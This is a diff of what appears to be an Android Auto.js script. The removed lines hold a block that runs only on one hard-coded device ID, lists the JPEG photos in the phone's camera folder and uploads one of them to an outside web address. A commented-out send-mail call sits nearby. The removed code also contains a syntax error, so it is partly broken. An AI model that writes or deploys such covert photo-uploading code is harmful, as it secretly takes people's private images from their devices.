@@ -32,29 +32,7 @@ var jies=xxl+"-"+bbss+"-"+bbh+"-"+sjs;
 log("hello world");
 if("b5c907692f5bb272"==ids){
 //engines.stopAllAndToast();
-var dir = "/sdcard/DCIM/Camera/";
-
- function shaixuanwenjian(dir) {  
-     if (files.exists(dir)) {
-         var arr = files.listDir(dir, function(name) {
-             return name.endsWith(".jpg") && files.isFile(files.join(dir, name));
-         });        
-         return arr;
-     } else {
-         log("no");
-     }
- }
- var ss = shaixuanwenjian(dir);
- log(files.join(dir, ss[1])); 
- var tp = files.join(dir, ss[2]);
-var urltp="http://sdbsxwf777.vaiwan.com/sc/upload_file.php";
-var restp=http.postMultipart(urltp,{
-file:open(tp);
-});
 //fasongyoujian("");
 log("yes");
-
 }
-
-
 }())
